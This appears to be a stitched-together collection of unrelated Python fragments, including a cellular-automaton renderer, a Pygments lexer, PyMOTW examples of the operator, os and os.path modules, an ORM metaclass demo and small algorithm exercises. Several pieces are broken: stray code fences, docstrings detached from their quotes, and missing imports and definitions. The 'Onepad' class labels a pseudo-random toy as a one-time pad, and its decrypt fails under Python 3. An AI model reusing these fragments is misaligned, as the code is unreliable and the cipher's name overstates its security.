# fmt: on


def format_ruleset(ruleset: int) -> list[int]:
    """
    >>> format_ruleset(11100)
    [0, 0, 0, 1, 1, 1, 0, 0]
    >>> format_ruleset(0)
    [0, 0, 0, 0, 0, 0, 0, 0]
    >>> format_ruleset(11111111)
    [1, 1, 1, 1, 1, 1, 1, 1]
    """
    return [int(c) for c in f"{ruleset:08}"[:8]]


def new_generation(cells: list[list[int]], rule: list[int], time: int) -> list[int]:
    population = len(cells[0])  # 31
    next_generation = []
    for i in range(population):
        # Get the neighbors of each cell
        # Handle neighbours outside bounds by using 0 as their value
        left_neighbor = 0 if i == 0 else cells[time][i - 1]
        right_neighbor = 0 if i == population - 1 else cells[time][i + 1]
        # Define a new cell and add it to the new generation
        situation = 7 - int(f"{left_neighbor}{cells[time][i]}{right_neighbor}", 2)
        next_generation.append(rule[situation])
    return next_generation


def generate_image(cells: list[list[int]]) -> Image.Image:
    """
    Convert the cells into a greyscale PIL.Image.Image and return it to the caller.
    >>> from random import random
    >>> cells = [[random() for w in range(31)] for h in range(16)]
    >>> img = generate_image(cells)
    >>> isinstance(img, Image.Image)
    True
    >>> img.width, img.height
    (31, 16)
    """
    # Create the output image
    img = Image.new("RGB", (len(cells[0]), len(cells)))
    pixels = img.load()
    # Generates image
    for w in range(img.width):
        for h in range(img.height):
            color = 255 - int(255 * cells[h][w])
            pixels[w, h] = (color, color, color)
    return img


if __name__ == "__main__":
    rule_num = bin(int(input("Rule:\n").strip()))[2:]
    rule = format_ruleset(int(rule_num))
    for time in range(16):
        CELLS.append(new_generation(CELLS, rule, time))
    img = generate_image(CELLS)
    # Uncomment to save the image
    # img.save(f"rule_{rule_num}.png")
    img.show()

from __future__ import print_function


class Onepad:
    def encrypt(self, text):
        '''Function to encrypt text using psedo-random numbers'''
        plain = [ord(i) for i in text]
        key = []
        cipher = []
        for i in plain:
            k = random.randint(1, 300)
            c = (i+k)*k
            cipher.append(c)
            key.append(k)
        return cipher, key

    def decrypt(self, cipher, key):
        '''Function to decrypt text using psedo-random numbers.'''
        plain = []
        for i in range(len(key)):
            p = (cipher[i]-(key[i])**2)/key[i]
            plain.append(chr(p))
        plain = ''.join([i for i in plain])
        return plain


if __name__ == '__main__':
    c, k = Onepad().encrypt('Hello')
    print(c, k)
    print(Onepad().decrypt(c, k))
````

````py
    pygments.lexers.ooc
    ~~~~~~~~~~~~~~~~~~~

    Lexers for the Ooc language.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexer import RegexLexer, bygroups, words
from pygments.token import Text, Comment, Operator, Keyword, Name, String, \
    Number, Punctuation

__all__ = ['OocLexer']


class OocLexer(RegexLexer):
    """
    For `Ooc <http://ooc-lang.org/>`_ source code

    .. versionadded:: 1.2
    """
    name = 'Ooc'
    aliases = ['ooc']
    filenames = ['*.ooc']
    mimetypes = ['text/x-ooc']

    tokens = {
        'root': [
            (words((
                'class', 'interface', 'implement', 'abstract', 'extends', 'from',
                'this', 'super', 'new', 'const', 'final', 'static', 'import',
                'use', 'extern', 'inline', 'proto', 'break', 'continue',
                'fallthrough', 'operator', 'if', 'else', 'for', 'while', 'do',
                'switch', 'case', 'as', 'in', 'version', 'return', 'true',
                'false', 'null'), prefix=r'\b', suffix=r'\b'),
             Keyword),
            (r'include\b', Keyword, 'include'),
            (r'(cover)([ \t]+)(from)([ \t]+)(\w+[*@]?)',
             bygroups(Keyword, Text, Keyword, Text, Name.Class)),
            (r'(func)((?:[ \t]|\\\n)+)(~[a-z_]\w*)',
             bygroups(Keyword, Text, Name.Function)),
            (r'\bfunc\b', Keyword),
            # Note: %= and ^= not listed on http://ooc-lang.org/syntax
            (r'//.*', Comment),
            (r'(?s)/\*.*?\*/', Comment.Multiline),
            (r'(==?|\+=?|-[=>]?|\*=?|/=?|:=|!=?|%=?|\?|>{1,3}=?|<{1,3}=?|\.\.|'
             r'&&?|\|\|?|\^=?)', Operator),
            (r'(\.)([ \t]*)([a-z]\w*)', bygroups(Operator, Text,
                                                 Name.Function)),
            (r'[A-Z][A-Z0-9_]+', Name.Constant),
            (r'[A-Z]\w*([@*]|\[[ \t]*\])?', Name.Class),

            (r'([a-z]\w*(?:~[a-z]\w*)?)((?:[ \t]|\\\n)*)(?=\()',
             bygroups(Name.Function, Text)),
            (r'[a-z]\w*', Name.Variable),

            # : introduces types
            (r'[:(){}\[\];,]', Punctuation),

            (r'0x[0-9a-fA-F]+', Number.Hex),
            (r'0c[0-9]+', Number.Oct),
            (r'0b[01]+', Number.Bin),
            (r'[0-9_]\.[0-9_]*(?!\.)', Number.Float),
            (r'[0-9_]+', Number.Decimal),

            (r'"(?:\\.|\\[0-7]{1,3}|\\x[a-fA-F0-9]{1,2}|[^\\"])*"',
             String.Double),
            (r"'(?:\\.|\\[0-9]{1,3}|\\x[a-fA-F0-9]{1,2}|[^\\\'\n])'",
             String.Char),
            (r'@', Punctuation),  # pointer dereference
            (r'\.', Punctuation),  # imports or chain operator

            (r'\\[ \t\n]', Text),
            (r'[ \t]+', Text),
        ],
        'include': [
            (r'[\w/]+', Name),
            (r',', Punctuation),
            (r'[ \t]', Text),
            (r'[;\n]', Text, '#pop'),
        ],
    }

# Write classes for the following class hierarchy:
#
#  [Vehicle]->[FlightVehicle]->[Starship]
#      |                |
#      v                v
# [GroundVehicle]      [Airplane]
#   |       |
#   v       v
# [Car]  [Motorcycle]
#
# Each class can simply "pass" for its body. The exercise is about setting up
# the hierarchy.
#
# e.g.
#
# class Whatever:
#     pass

class Vehicle:
    pass

class GroundVehicle(Vehicle):
    pass

class Car(GroundVehicle):
    pass

class Motorcycle(GroundVehicle):
    pass

class FlightVehicle(Vehicle):
    pass

class Airplane(FlightVehicle):
    pass

class Starship(FlightVehicle):
    pass

# Put a comment noting which class is the base class

# To the GroundVehicle class, add method drive() that returns "vroooom".
#
# Also change it so the num_wheels defaults to 4 if not specified when the
# object is constructed.

class GroundVehicle():
    def __init__(self, num_wheels = 4):
        self.num_wheels = num_wheels

    def drive(self):
        return "vroooom"

    # TODO

# Subclass Motorcycle from GroundVehicle.
#
# Make it so when you instantiate a Motorcycle, it automatically sets the number
# of wheels to 2 by passing that to the constructor of its superclass.
#
# Override the drive() method in Motorcycle so that it returns "BRAAAP!!"

# TODO

class Motorcycle(GroundVehicle):
    def __init__(self):
        super().__init__(2)

    def drive(self):
        return 'BRAAAP!!'

vehicles = [
    GroundVehicle(),
    GroundVehicle(),
    Motorcycle(),
    GroundVehicle(),
    Motorcycle(),
]

# Go through the vehicles list and print the result of calling drive() on each.

# TODO

for engines in vehicles:
    print(engines.drive())


import cv2

# Load the cascade
face_cascade = cv2.CascadeClassifier('haarcascade_frontalface_default.xml')

# To capture video from webcam.
cap = cv2.VideoCapture(0)

while True:
    # Read the frame
    _, img = cap.read()
    # Convert to grayscale
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    # Detect the faces
    faces = face_cascade.detectMultiScale(gray, 1.1, 4)
    # Draw the rectangle around each face
    for (x, y, w, h) in faces:
        cv2.rectangle(img, (x, y), (x+w, y+h), (0, 255, 255), 2)
    # Display
    cv2.imshow('img', img)
    # Stop if escape key is pressed
    k = cv2.waitKey(30) & 0xff
    if k==27:
        break
# Release the VideoCapture object
cap.release()```


```py
Open in editor key bindings.```


```py
from prompt_toolkit.filters import emacs_mode, has_selection, vi_navigation_mode

from ..key_bindings import KeyBindings, KeyBindingsBase, merge_key_bindings
from .named_commands import get_by_name

__all__ = [
    "load_open_in_editor_bindings",
    "load_emacs_open_in_editor_bindings",
    "load_vi_open_in_editor_bindings",
]


def load_open_in_editor_bindings() -> KeyBindingsBase:
    """
    Load both the Vi and emacs key bindings for handling edit-and-execute-command.
    """
    return merge_key_bindings(
        [
            load_emacs_open_in_editor_bindings(),
            load_vi_open_in_editor_bindings(),
        ]
    )


def load_emacs_open_in_editor_bindings() -> KeyBindings:
    """
    Pressing C-X C-E will open the buffer in an external editor.
    """
    key_bindings = KeyBindings()

    key_bindings.add("c-x", "c-e", filter=emacs_mode & ~has_selection)(
        get_by_name("edit-and-execute-command")
    )

    return key_bindings


def load_vi_open_in_editor_bindings() -> KeyBindings:
    """
    Pressing 'v' in navigation mode will open the buffer in an external editor.
    """
    key_bindings = KeyBindings()
    key_bindings.add("v", filter=vi_navigation_mode)(
        get_by_name("edit-and-execute-command")
    )
    return key_bindings

```









---


```py


#end_pymotw_header
from operator import *


class MyObj:
    """example class for attrgetter"""

    def __init__(self, arg):
        super().__init__()
        self.arg = arg

    def __repr__(self):
        return 'MyObj({})'.format(self.arg)


l = [MyObj(i) for i in range(5)]
print('objects   :', l)

# Extract the 'arg' value from each object
g = attrgetter('arg')
vals = [g(i) for i in l]
print('arg values:', vals)

# Sort using arg
l.reverse()
print('reversed  :', l)
print('sorted    :', sorted(l, key=g))

```









---


```py


#end_pymotw_header
from operator import *

a = -1
b = 5

print('a =', a)
print('b =', b)
print()

print('not_(a)     :', not_(a))
print('truth(a)    :', truth(a))
print('is_(a, b)   :', is_(a, b))
print('is_not(a, b):', is_not(a, b))

```









---


```py


#end_pymotw_header
from operator import *


class MyObj:
    """Example for operator overloading"""

    def __init__(self, val):
        super(MyObj, self).__init__()
        self.val = val

    def __str__(self):
        return 'MyObj({})'.format(self.val)

    def __lt__(self, other):
        """compare for less-than"""
        print('Testing {} < {}'.format(self, other))
        return self.val < other.val

    def __add__(self, other):
        """add values"""
        print('Adding {} + {}'.format(self, other))
        return MyObj(self.val + other.val)


a = MyObj(1)
b = MyObj(2)

print('Comparison:')
print(lt(a, b))

print('\nArithmetic:')
print(add(a, b))

```









---


```py


#end_pymotw_header
from operator import *

a = 1
b = 5.0

print('a =', a)
print('b =', b)
for func in (lt, le, eq, ne, ge, gt):
    print('{}(a, b): {}'.format(func.__name__, func(a, b)))

```









---


```py


#end_pymotw_header
from operator import *

a = -1
b = 5.0
c = [1, 2, 3]
d = ['a', 'b', 'c']
print('a =', a)
print('b =', b)
print('c =', c)
print('d =', d)
print()

a = iadd(a, b)
print('a = iadd(a, b) =>', a)
print()

c = iconcat(c, d)
print('c = iconcat(c, d) =>', c)

```









---


```py


#end_pymotw_header
from operator import *

l = [dict(val=-1 * i) for i in range(4)]
print('Dictionaries:')
print(' original:', l)
g = itemgetter('val')
vals = [g(i) for i in l]
print('   values:', vals)
print('   sorted:', sorted(l, key=g))

print()
l = [(i, i * -2) for i in range(4)]
print('\nTuples:')
print(' original:', l)
g = itemgetter(1)
vals = [g(i) for i in l]
print('   values:', vals)
print('   sorted:', sorted(l, key=g))

```









---


```py


#end_pymotw_header
from operator import *

a = -1
b = 5.0
c = 2
d = 6

print('a =', a)
print('b =', b)
print('c =', c)
print('d =', d)

print('\nPositive/Negative:')
print('abs(a):', abs(a))
print('neg(a):', neg(a))
print('neg(b):', neg(b))
print('pos(a):', pos(a))
print('pos(b):', pos(b))

print('\nArithmetic:')
print('add(a, b)     :', add(a, b))
print('floordiv(a, b):', floordiv(a, b))
print('floordiv(d, c):', floordiv(d, c))
print('mod(a, b)     :', mod(a, b))
print('mul(a, b)     :', mul(a, b))
print('pow(c, d)     :', pow(c, d))
print('sub(b, a)     :', sub(b, a))
print('truediv(a, b) :', truediv(a, b))
print('truediv(d, c) :', truediv(d, c))

print('\nBitwise:')
print('and_(c, d)  :', and_(c, d))
print('invert(c)   :', invert(c))
print('lshift(c, d):', lshift(c, d))
print('or_(c, d)   :', or_(c, d))
print('rshift(d, c):', rshift(d, c))
print('xor(c, d)   :', xor(c, d))

```









---


```py


#end_pymotw_header
from operator import *

a = [1, 2, 3]
b = ['a', 'b', 'c']

print('a =', a)
print('b =', b)

print('\nConstructive:')
print('  concat(a, b):', concat(a, b))

print('\nSearching:')
print('  contains(a, 1)  :', contains(a, 1))
print('  contains(b, "d"):', contains(b, "d"))
print('  countOf(a, 1)   :', countOf(a, 1))
print('  countOf(b, "d") :', countOf(b, "d"))
print('  indexOf(a, 5)   :', indexOf(a, 1))

print('\nAccess Items:')
print('  getitem(b, 1)                  :',
      getitem(b, 1))
print('  getitem(b, slice(1, 3))        :',
      getitem(b, slice(1, 3)))
print('  setitem(b, 1, "d")             :', end=' ')
setitem(b, 1, "d")
print(b)
print('  setitem(a, slice(1, 3), [4, 5]):', end=' ')
setitem(a, slice(1, 3), [4, 5])
print(a)

print('\nDestructive:')
print('  delitem(b, 1)          :', end=' ')
delitem(b, 1)
print(b)
print('  delitem(a, slice(1, 3)):', end=' ')
delitem(a, slice(1, 3))
print(a)

# -*- coding: utf-8 -*-```


```pyThe optimizer tries to constant fold expressions and modify the AST
in place so that it should be faster to evaluate.

Because the AST does not contain all the scoping information and the
compiler has to find that out, we cannot do all the optimizations we
want. For example, loop unrolling doesn't work because unrolled loops
would have a different scope. The solution would be a second syntax tree
that stored the scoping rules.```


```py
from . import nodes
from .visitor import NodeTransformer


def optimize(node, environment):
    """The context hint can be used to perform an static optimization
    based on the context given."""
    optimizer = Optimizer(environment)
    return optimizer.visit(node)


class Optimizer(NodeTransformer):
    def __init__(self, environment):
        self.environment = environment

    def generic_visit(self, node, *args, **kwargs):
        node = super(Optimizer, self).generic_visit(node, *args, **kwargs)

        # Do constant folding. Some other nodes besides Expr have
        # as_const, but folding them causes errors later on.
        if isinstance(node, nodes.Expr):
            try:
                return nodes.Const.from_untrusted(
                    node.as_const(args[0] if args else None),
                    lineno=node.lineno,
                    environment=self.environment,
                )
            except nodes.Impossible:
                pass

        return node

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

import optparse  # pylint: disable=deprecated-module

from pylint.config.option import Option


def _level_options(group, outputlevel):
    return [
        option
        for option in group.option_list
        if (getattr(option, "level", 0) or 0) <= outputlevel
        and option.help is not optparse.SUPPRESS_HELP
    ]


class OptionParser(optparse.OptionParser):
    def __init__(self, option_class, *args, **kwargs):
        optparse.OptionParser.__init__(self, option_class=Option, *args, **kwargs)

    def format_option_help(self, formatter=None):
        if formatter is None:
            formatter = self.formatter
        outputlevel = getattr(formatter, "output_level", 0)
        formatter.store_option_strings(self)
        result = []
        result.append(formatter.format_heading("Options"))
        formatter.indent()
        if self.option_list:
            result.append(optparse.OptionContainer.format_option_help(self, formatter))
            result.append("\n")
        for group in self.option_groups:
            if group.level <= outputlevel and (
                group.description or _level_options(group, outputlevel)
            ):
                result.append(group.format_help(formatter))
                result.append("\n")
        formatter.dedent()
        # Drop the last "\n", or the header if no options or option groups:
        return "".join(result[:-1])

    def _match_long_opt(self, opt):
        """Disable abbreviations."""
        if opt not in self._long_opt:
            raise optparse.BadOptionError(opt)
        return opt

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
````

```pyOptions module."""

from argparse import Namespace

config = Namespace()

from collections import OrderedDict

from . import TomlDecoder, TomlEncoder


class TomlOrderedDecoder(TomlDecoder):
    def __init__(self):
        super(self.__class__, self).__init__(_dict=OrderedDict)


class TomlOrderedEncoder(TomlEncoder):
    def __init__(self):
        super(self.__class__, self).__init__(_dict=OrderedDict)

def binary_search(array, n):
 arr = sorted(array)
 to_return = False
 first_elem = 0
 last_elem = len(arr) - 1
 while (first_elem <= last_elem):
  mid = (first_elem + last_elem) // 2
  if (arr[mid] == n):
   to_return = True
   break
  else:
   if (n > arr[mid]):
    first_elem = mid + 1
   else:
    last_elem = mid - 1
 return to_return


def Ordered_binary_search(arra, elem):
 if (len(arra) == 0):
  return False

 middle = len(arra) // 2
 if (arra[middle] == elem):
  return True
 else:
  if (elem > arra[middle]):
   return binary_search(arra[middle:], elem)
  else:
   return binary_search(arra[:middle], elem)

nums = [0,23,54,5,32,78]
print Ordered_binary_search(nums, 32)
print Ordered_binary_search(nums, 5)
```

````py
Ordered Digits

We are given a number and we need to transform to a new number where all its digits are ordered in a non descending order.
We are allowed to increase or decrease a digit by 1, and each of those actions counts as one operation.
We are also allowed to over/underflow a number meaning from '9' we can change to '0' and also from '0' to '9', also costing only one operation.
One same digit can be changed multiple times.
Find the minimum number of operations we need to do do to create a new number with its ordered digits.

Input: 301
Output: 3
Output explanation: 301 -> 201 -> 101 -> 111, in this case 3 operations are required to get an ordered number.

Input: 901
Output: 1
Output explanation: 901 -> 001, in this case 1 operation is required to get an ordered number.

Input: 5982
Output: 4
Output explanation: 5982 -> 5981 -> 5980 -> 5989 -> 5999, in this case 4 operations are required to get an ordered number.

=========================================
Dynamic programming solution. For each position, calculate the cost of transformation to each possible digit (0-9).
And take the minimum value from the previous position (but smaller than the current digit).
    Time Complexity:    O(N)    , O(N*10) = O(N), N = number of digits
    Space Complexity:   O(N)    , same O(N*2) = O(N)```


```py


############
# Solution #
############


def ordered_digits(number):
    n = len(number)
    dp = [[0 for j in range(10)] for i in range(2)]

    for i in range(n):
        min_prev = float("inf")
        for j in range(10):
            # find the min value from the previous digit and add it to the current value
            min_prev = min(min_prev, dp[(i - 1) % 2][j])
            # compute diff between the current digit and wanted digit
            diff = abs(j - int(number[i]))
            dp[i % 2][j] = min(diff, 10 - diff) + min_prev

    # min value from the last digit
    return min(dp[(n - 1) % 2])


###########
# Testing #
###########

# Test 1
# Correct result => 3
print(ordered_digits("301"))

# Test 2
# Correct result => 1
print(ordered_digits("901"))

# Test 3
# Correct result => 4
print(ordered_digits("5982"))

# The stack remains always ordered such that the highest value is at the top and the lowest at the bottom


class OrderedStack:
    def __init__(self):
        self.items = []

    def is_empty(self):
        return self.items == []

    def push_t(self, item):
        self.items.append(item)

    def push(self, item):  # push method to maintain order when pushing new elements
        temp_stack = OrderedStack()
        if self.is_empty() or item > self.peek():
            self.push_t(item)
        else:
            while item < self.peek() and not self.is_empty():
                temp_stack.push_t(self.pop())
            self.push_t(item)
            while not temp_stack.is_empty():
                self.push_t(temp_stack.pop())

    def pop(self):
        if self.is_empty():
            raise IndexError("Stack is empty")
        return self.items.pop()

    def peek(self):
        return self.items[len(self.items) - 1]

    def size(self):
        return len(self.items)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

" Simple ORM using metaclass "


class Field(object):
    def __init__(self, name, column_type):
        self.name = name
        self.column_type = column_type

    def __str__(self):
        return "<%s:%s>" % (self.__class__.__name__, self.name)


class StringField(Field):
    def __init__(self, name):
        super(StringField, self).__init__(name, "varchar(100)")


class IntegerField(Field):
    def __init__(self, name):
        super(IntegerField, self).__init__(name, "bigint")


class ModelMetaclass(type):
    def __new__(cls, name, bases, attrs):
        if name == "Model":
            return type.__new__(cls, name, bases, attrs)
        print("Found model: %s" % name)
        mappings = dict()
        for k, v in attrs.items():
            if isinstance(v, Field):
                print("Found mapping: %s ==> %s" % (k, v))
                mappings[k] = v
        for k in mappings.keys():
            attrs.pop(k)
        attrs["__mappings__"] = mappings  #
        attrs["__table__"] = name  #
        return type.__new__(cls, name, bases, attrs)


class Model(dict, metaclass=ModelMetaclass):
    def __init__(self, **kw):
        super(Model, self).__init__(**kw)

    def __getattr__(self, key):
        try:
            return self[key]
        except KeyError:
            raise AttributeError(r"'Model' object has no attribute '%s'" % key)

    def __setattr__(self, key, value):
        self[key] = value

    def save(self):
        fields = []
        params = []
        args = []
        for k, v in self.__mappings__.items():
            fields.append(v.name)
            params.append("?")
            args.append(getattr(self, k, None))
        sql = "insert into %s (%s) values (%s)" % (
            self.__table__,
            ",".join(fields),
            ",".join(params),
        )
        print("SQL: %s" % sql)
        print("ARGS: %s" % str(args))


# testing code:


class User(Model):
    id = IntegerField("id")
    name = StringField("username")
    email = StringField("email")
    password = StringField("password")


u = User(id=12345, name="Michael", email="test@orm.org", password="my-pwd")
u.save()

#!/usr/bin/env python3```


```pyCheck access rights on a file```


```py

#end_pymotw_header
import os

print('Testing:', __file__)
print('Exists:', os.access(__file__, os.F_OK))
print('Readable:', os.access(__file__, os.R_OK))
print('Writable:', os.access(__file__, os.W_OK))
print('Executable:', os.access(__file__, os.X_OK))

#!/usr/bin/env python3```


```pyUsing the os module to read and write environment variables.```


```py

#end_pymotw_header
import os

print('Starting:', os.getcwd())

print('Moving up one:', os.pardir)
os.chdir(os.pardir)

print('After move:', os.getcwd())

#!/usr/bin/env python3```


```pyWorking with directories.```


```py

#end_pymotw_header
import os

dir_name = 'os_directories_example'

print('Creating', dir_name)
os.makedirs(dir_name)

file_name = os.path.join(dir_name, 'example.txt')
print('Creating', file_name)
with open(file_name, 'wt') as f:
    f.write('example file')

print('Cleaning up')
os.unlink(file_name)
os.rmdir(dir_name)

#!/usr/bin/env python3```


```pyUsing the os module to read and write environment variables.```


```py

#end_pymotw_header
import os

print('Initial value:', os.environ.get('TESTVAR', None))
print('Child process:')
os.system('echo $TESTVAR')

os.environ['TESTVAR'] = 'THIS VALUE WAS CHANGED'

print()
print('Changed value:', os.environ['TESTVAR'])
print('Child process:')
os.system('echo $TESTVAR')

del os.environ['TESTVAR']

print()
print('Removed value:', os.environ.get('TESTVAR', None))
print('Child process:')
os.system('echo $TESTVAR')

#!/usr/bin/env python3```


```pyUsing os.exec*().```


```py

#end_pymotw_header
import os

child_pid = os.fork()
if child_pid:
    os.waitpid(child_pid, 0)
else:
    os.execlp('pwd', 'pwd', '-P')

#!/usr/bin/env python3```


```pySimple example of using os.fork to create a new child process.```


```py

#end_pymotw_header
import os

pid = os.fork()

if pid:
    print('Child process id:', pid)
else:
    print('I am the child')

#!/usr/bin/env python3```


```pyFork, then send the child process a signal.```


```py

#end_pymotw_header
import os
import signal
import time


def signal_usr1(signum, frame):
    "Callback invoked when a signal is received"
    pid = os.getpid()
    print('Received USR1 in process {}'.format(pid))


print('Forking...')
child_pid = os.fork()
if child_pid:
    print('PARENT: Pausing before sending signal...')
    time.sleep(1)
    print('PARENT: Signaling {}'.format(child_pid))
    os.kill(child_pid, signal.SIGUSR1)
else:
    print('CHILD: Setting up signal handler')
    signal.signal(signal.SIGUSR1, signal_usr1)
    print('CHILD: Pausing to wait for signal')
    time.sleep(5)

#!/usr/bin/env python3```


```pyA simple directory listing.```


```py

#end_pymotw_header
import os
import sys

print(sorted(os.listdir(sys.argv[1])))

#!/usr/bin/env python3```


```pyFind information about the current process.```


```py

#end_pymotw_header
import os

print('This process id:', os.getpid())
print('Parent process :', os.getppid())
print('Process group  :', os.getpgid(os.getpid()))
print('Parent group   :', os.getpgid(os.getppid()))
print('Session id     :', os.getsid(0))

#!/usr/bin/env python3```


```pyFind information about the user running the current process.```


```py

#end_pymotw_header
import os

TEST_GID = 502
TEST_UID = 502


def show_user_info():
    print('User (actual/effective)  : {} / {}'.format(
        os.getuid(), os.geteuid()))
    print('Group (actual/effective) : {} / {}'.format(
        os.getgid(), os.getegid()))
    print('Actual Groups   :', os.getgroups())


print('BEFORE CHANGE:')
show_user_info()
print()

try:
    os.setegid(TEST_GID)
except OSError:
    print('ERROR: Could not change effective group. '
          'Rerun as root.')
else:
    print('CHANGE GROUP:')
    show_user_info()
    print()

try:
    os.seteuid(TEST_UID)
except OSError:
    print('ERROR: Could not change effective user. '
          'Rerun as root.')
else:
    print('CHANGE USER:')
    show_user_info()
    print()

#!/usr/bin/env python3```


```pyRenaming and replacing files```


```py

#end_pymotw_header
import glob
import os


with open('rename_start.txt', 'w') as f:
    f.write('starting as rename_start.txt')

print('Starting:', glob.glob('rename*.txt'))

os.rename('rename_start.txt', 'rename_finish.txt')

print('After rename:', glob.glob('rename*.txt'))

with open('rename_finish.txt', 'r') as f:
    print('Contents:', repr(f.read()))

with open('rename_new_contents.txt', 'w') as f:
    f.write('ending with contents of rename_new_contents.txt')

os.replace('rename_new_contents.txt', 'rename_finish.txt')

with open('rename_finish.txt', 'r') as f:
    print('After replace:', repr(f.read()))

for name in glob.glob('rename*.txt'):
    os.unlink(name)

#!/usr/bin/env python3```


```pyA fuller directory listing.```


```py

#end_pymotw_header
import os
import sys

for entry in os.scandir(sys.argv[1]):
    if entry.is_dir():
        typ = 'dir'
    elif entry.is_file():
        typ = 'file'
    elif entry.is_symlink():
        typ = 'link'
    else:
        typ = 'unknown'
    print('{name} {typ}'.format(
        name=entry.name,
        typ=typ,
    ))

#!/usr/bin/env python3```


```pyUsing spawn*() instead of fork() and exec*().```


```py

#end_pymotw_header
import os

os.spawnlp(os.P_WAIT, 'pwd', 'pwd', '-P')

#!/usr/bin/env python3```


```pyShow stat info for a file.```


```py

#end_pymotw_header
import os
import sys
import time

if len(sys.argv) == 1:
    filename = __file__
else:
    filename = sys.argv[1]

stat_info = os.stat(filename)

print('os.stat({}):'.format(filename))
print('  Size:', stat_info.st_size)
print('  Permissions:', oct(stat_info.st_mode))
print('  Owner:', stat_info.st_uid)
print('  Device:', stat_info.st_dev)
print('  Created      :', time.ctime(stat_info.st_ctime))
print('  Last modified:', time.ctime(stat_info.st_mtime))
print('  Last accessed:', time.ctime(stat_info.st_atime))

#!/usr/bin/env python3```


```pyChange permissions on a file```


```py

#end_pymotw_header
import os
import stat

filename = 'os_stat_chmod_example.txt'
if os.path.exists(filename):
    os.unlink(filename)
with open(filename, 'wt') as f:
    f.write('contents')

# Determine what permissions are already set using stat
existing_permissions = stat.S_IMODE(os.stat(filename).st_mode)

if not os.access(filename, os.X_OK):
    print('Adding execute permission')
    new_permissions = existing_permissions | stat.S_IXUSR
else:
    print('Removing execute permission')
    # use xor to remove the user execute permission
    new_permissions = existing_permissions ^ stat.S_IXUSR

os.chmod(filename, new_permissions)

#!/usr/bin/env python3```


```pyShow some of the system error messages```


```py

#end_pymotw_header
import errno
import os

for num in [errno.ENOENT, errno.EINTR, errno.EBUSY]:
    name = errno.errorcode[num]
    print('[{num:>2}] {name:<6}: {msg}'.format(
        name=name, num=num, msg=os.strerror(num)))

#!/usr/bin/env python3```


```pyWorking with symbolic links```


```py

#end_pymotw_header
import os

link_name = '/tmp/' + os.path.basename(__file__)

print('Creating link {} -> {}'.format(link_name, __file__))
os.symlink(__file__, link_name)

stat_info = os.lstat(link_name)
print('Permissions:', oct(stat_info.st_mode))

print('Points to:', os.readlink(link_name))

# Cleanup
os.unlink(link_name)

#!/usr/bin/env python3```


```pyRunning a command in the background```


```py

#end_pymotw_header
import os
import time

print('Calling...')
os.system('date; (sleep 3; date) &')

print('Sleeping...')
time.sleep(5)

#!/usr/bin/env python3```


```pyUsing os.system() to run external commands.```


```py

#end_pymotw_header
import os

# Simple command
os.system('pwd')

#!/usr/bin/env python3```


```pyUsing os.system() to run external commands.```


```py

#end_pymotw_header
import os

# Command with shell expansion
os.system('echo $TMPDIR')

#!/usr/bin/env python3```


```pyWait for a worker process.```


```py

#end_pymotw_header
import os
import sys
import time

for i in range(2):
    print('PARENT {}: Forking {}'.format(os.getpid(), i))
    worker_pid = os.fork()
    if not worker_pid:
        print('WORKER {}: Starting'.format(i))
        time.sleep(2 + i)
        print('WORKER {}: Finishing'.format(i))
        sys.exit(i)

for i in range(2):
    print('PARENT: Waiting for {}'.format(i))
    done = os.wait()
    print('PARENT: Child done:', done)

#!/usr/bin/env python3```


```pyWait for a worker process.```


```py

#end_pymotw_header
import os
import sys
import time

workers = []
for i in range(2):
    print('PARENT {}: Forking {}'.format(os.getpid(), i))
    worker_pid = os.fork()
    if not worker_pid:
        print('WORKER {}: Starting'.format(i))
        time.sleep(2 + i)
        print('WORKER {}: Finishing'.format(i))
        sys.exit(i)
    workers.append(worker_pid)

for pid in workers:
    print('PARENT: Waiting for {}'.format(pid))
    done = os.waitpid(pid, 0)
    print('PARENT: Child done:', done)

#!/usr/bin/env python3```


```pyA simple recursive directory listing.```


```py

#end_pymotw_header
import os
import sys

# If we are not given a path to list, use /tmp
if len(sys.argv) == 1:
    root = '/tmp'
else:
    root = sys.argv[1]

for dir_name, sub_dirs, files in os.walk(root):
    print(dir_name)
    # Make the subdirectory names stand out with /
    sub_dirs = [n + '/' for n in sub_dirs]
    # Mix the directory contents together
    contents = sub_dirs + files
    contents.sort()
    # Show the contents
    for c in contents:
        print('  {}'.format(c))
    print()

#```


```pyCompute an absolute path from a relative path.```


```py


#end_pymotw_header
import os
import os.path

os.chdir('/usr')

PATHS = [
    '.',
    '..',
    './one/two/three',
    '../one/two/three',
]

for path in PATHS:
    print('{!r:>21} : {!r}'.format(path, os.path.abspath(path)))

#```


```pyDetermine the base filename from a path.```


```py


#end_pymotw_header
import os.path

PATHS = [
    '/one/two/three',
    '/one/two/three/',
    '/',
    '.',
    '',
]

for path in PATHS:
    print('{!r:>17} : {!r}'.format(path, os.path.basename(path)))

#```


```pyFind the prefix string common to a group of paths.```


```py


#end_pymotw_header
import os.path

paths = ['/one/two/three/four',
         '/one/two/threefold',
         '/one/two/three/',
         ]
for path in paths:
    print('PATH:', path)

print()
print('PREFIX:', os.path.commonpath(paths))

#```


```pyFind the prefix string common to a group of paths.```


```py


#end_pymotw_header
import os.path

paths = ['/one/two/three/four',
         '/one/two/threefold',
         '/one/two/three/',
         ]
for path in paths:
    print('PATH:', path)

print()
print('PREFIX:', os.path.commonprefix(paths))

#```


```pyFind the directory portion of a filename.```


```py


#end_pymotw_header
import os.path

PATHS = [
    '/one/two/three',
    '/one/two/three/',
    '/',
    '.',
    '',
]

for path in PATHS:
    print('{!r:>17} : {!r}'.format(path, os.path.dirname(path)))

#```


```pyExpand tilde in filenames.```


```py


#end_pymotw_header
import os.path

for user in ['', 'dhellmann', 'nosuchuser']:
    lookup = '~' + user
    print('{!r:>15} : {!r}'.format(
        lookup, os.path.expanduser(lookup)))

#```


```pyExpand shell variables in filenames.```


```py


#end_pymotw_header
import os.path
import os

os.environ['MYVAR'] = 'VALUE'

print(os.path.expandvars('/path/to/$MYVAR'))

#```


```pyCombine path components to create a single path.```


```py


#end_pymotw_header
import os.path

PATHS = [
    ('one', 'two', 'three'),
    ('/', 'one', 'two', 'three'),
